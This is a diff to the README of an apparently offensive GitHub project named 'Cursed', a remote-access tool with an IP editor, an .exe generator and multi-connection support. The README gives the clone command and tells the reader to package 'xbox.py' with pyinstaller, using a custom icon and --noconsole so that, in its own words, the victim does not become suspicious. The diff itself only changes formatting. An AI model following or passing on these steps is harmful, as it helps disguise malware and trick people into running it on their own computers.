@@ -5,7 +5,7 @@
 ✨ Edit ip.<br>
 ✨ .exe generator.<br>
 ✨ Multi connection.<br>
-## >> How can i download in kali linux.
+## >> How can i download in kali linux ?
  <code>git clone https://github.com/utkayfirat/Cursed.git</code>
 ## >> What can it do?
  <img src="https://github.com/utkayfirat/Cursed/blob/main/somephoto/0.png"><br>
@@ -15,7 +15,7 @@
  <img src="https://github.com/utkayfirat/Cursed/blob/main/somephoto/2.png"><br>
 ## >> Now you need an ico file and xbox.py, We will use pyinstaller on Windows 10.
  <img src="https://github.com/utkayfirat/Cursed/blob/main/somephoto/3.png"><br>
-## >> pyinstaller --onefile xbox.py --icon index.ico --noconsole
+## >> <code>pyinstaller --onefile xbox.py --icon index.ico --noconsole</code>
    <b>Why use --noconsole ?</b><br>
    Because we don't want to make the person suspicious.<br>
    <b>Why use --onefile ?</b><br>
